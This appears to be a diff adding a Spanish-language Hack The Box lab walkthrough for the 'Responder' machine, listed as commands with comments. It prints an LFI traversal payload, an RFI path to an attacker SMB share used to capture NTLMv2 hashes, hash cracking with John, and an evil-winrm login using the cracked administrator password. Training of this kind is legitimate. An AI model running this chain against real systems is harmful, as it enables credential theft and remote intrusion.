@@ -1,0 +1,13 @@
+HACK THE BOX - MACHINE RESPONDER
+- firefox http://10.129.125.215												-Ingresamos a la dirección
+																			-Al no poder resolver el servidor DNS la dirección, puesto que el servidor usa Name-based virtual hosting, el cual permite a varios sitios compartir una misma IP, por lo tanto se agrega la IP y la URL como host local
+- sudo vi /etc/hosts														-Agregamos la IP y URL para proporcionar resoluciones de nombres de manera local.
+																			-Una vez que accedimos a la web, se puede ver que esta, puede ser vulnerada a través de LFI(Local File Inclusion)
+- ../../windows/system32/drivers/etc/hosts									-"../" es lo que agregamos a la URL para llegar al directorio base "C:\", la URL quedaria (http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts)
+- sudo responder -I tun0													-Se activa el servidor a la escucha con el responder a través del cual a través de SMB inyectado en la URL estaremos a la escucha para descubrir las credenciales
+- //10.10.14.38/somefile													-hacemos uso de RFI(Remote File Inclusion - http://unika.htb/index.php?page=//10.10.14.38/somefile) a traves de la IP del servidor de responder a través del cual capturamos las credenciales enviadas con el hash NTLMv2
+- echo  "...HashCapturado..." > hash.txt									-Guardamos el Hash capturado en el archivo .txt, para poder decifrarlo
+- john -w=/usr/share/wordlitsts/rockyou.txt hash.txt						-Mediante el uso de la herramienta JohnTheRipper, hacemos un cracking del hash y obtenemos el password en texto plano
+- evil-winrm -i 10.129.125.215 -u administrator -p badminton				-Usando la herramienta "Evil-winrm" hacemos una conexión remota con el host a través del puerto 5985.
+- dir o Get-ChildItem -Recurse												-Una vez en el host remoto, podemos listar los documentos y archivo con el comando Dir /A(en CMD) o también Get-ChilItem -Recurse (en PowerShell)
+- type flag.txt																-Una vez en el directorio en el que se encuentra el flag. a través del comando TYPE vemos su contenido.
